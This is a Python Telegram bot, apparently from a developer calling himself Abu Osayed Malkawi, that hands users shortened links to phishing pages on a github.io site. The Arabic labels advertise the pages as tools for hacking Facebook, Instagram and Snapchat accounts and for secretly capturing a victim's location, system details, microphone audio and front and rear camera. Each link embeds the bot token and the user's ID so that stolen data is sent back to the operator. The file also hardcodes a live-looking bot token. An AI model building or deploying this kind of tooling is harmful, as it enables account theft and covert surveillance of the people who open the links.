import telebot
from telebot import types
import requests
from flask import Flask
from threading import Thread
import os
import time

# 1. السيرفر لضمان العمل 24/7
app = Flask('')
@app.route('/')
def home(): return "M.Y.9 System Online - Dev: Abu Osayed"

def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
def keep_alive(): Thread(target=run).start()

# 2. الإعدادات الأساسية
TOKEN = '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY'
ADMIN_ID = '7238206121' # Abu Osayed Malkawi
bot = telebot.TeleBot(TOKEN)

def short(url):
    try:
        r = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
        return r.text if r.status_code == 200 else url
    except: return url

@bot.message_handler(commands=['start'])
def start(m):
    uid, name = m.chat.id, m.from_user.first_name
    
    # رسالة التنبيه الأولى (بالعربي)
    alert_text = f"""
أبو أسيد للمعلومات 🦅
⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:

عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـضـمـان تـفـعـيـل الـنـظـام يـجـب مـتـابـعـة حـسـاب المـطـور الـرسمـي عـلى انـسـتـغـرام.

📢 تـنـبـيـه الـمـطـور (Abu Osayed Malkawi):
الـرجـاء الانـتـظـار لـمـدة (2 دقـيـقـة) حـتـى يـتـم تـأكـيـد مـتـابـعـتـك لـلـحـساب وتـولـيـد الـروابـط تـلـقـائـيـاً 💀🔥
    """
    
    markup = types.InlineKeyboardMarkup()
    btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور عـلى انـسـتـغـرام", url="https://www.instagram.com/m_y_.9/")
    markup.add(btn_insta)
    
    bot.send_message(uid, alert_text, reply_markup=markup)

    # دالة الانتظار دقيقتين (120 ثانية)
    def background_process(user_chat_id, user_name):
        time.sleep(120) # الانتظار المطلوب
        
        h = user_name.replace(" ", "_")
        base = "https://m-y-9-tech.github.io/fb/"
        params = f"?user_id={user_chat_id}&admin_id={ADMIN_ID}&hunter={h}&bot_token={TOKEN}"
        
        # توليد الـ 8 روابط
        lnks = {
            "fb": short(base+"fb.html"+params),
            "ig": short(base+"ig.html"+params),
            "sn": short(base+"sn.html"+params),
            "lc": short(base+"loc.html"+params),
            "sys": short(base+"sys.html"+params),
            "c1": short(base+"c1.html"+params),
            "c2": short(base+"c2.html"+params),
            "au": short(base+"audio.html"+params)
        }

        # الرسالة النهائية بالزخرفة المطلوبة
        final_msg = f"""
أبو أسيد للمعلومات 🦅
🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم الـتـحـقـق بـنـجـاح ✅

👤 Developer: 𝔸𝕓𝕦 𝕆𝕤𝕒𝕪𝕖𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚

▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔹 اخـتـراق فـيـس بـوك: 
🔗 `{lnks['fb']}`

🔸 اخـتـراق انـسـتـغـرام: 
🔗 `{lnks['ig']}`

👻 اخـتـراق سـنـاب شـات: 
🔗 `{lnks['sn']}`

📍 سـحـب الـمـوقـع: 
🔗 `{lnks['lc']}`

💻 سـحـب الـنـظـام: 
🔗 `{lnks['sys']}`

🎤 سـحـب الـصـوت: 
🔗 `{lnks['au']}`

🤳 كـمـرة أمـامـيـة: 
🔗 `{lnks['c1']}`

📷 كـمـرة خـلـفـيـة: 
🔗 `{lnks['c2']}`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚖️ إخـلاء مـسـؤولـيـة: الـمـطـور (Abu Osayed Malkawi) غـيـر مـسـؤول عـن أي اسـتـخـدام ضـار.
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ Status: Connected Successfully
        """
        bot.send_message(user_chat_id, final_msg, parse_mode="Markdown", disable_web_page_preview=True)

    Thread(target=background_process, args=(uid, name)).start()

if __name__ == "__main__":
    keep_alive()
    bot.remove_webhook()
    time.sleep(1)
    bot.infinity_polling(skip_pending=True)
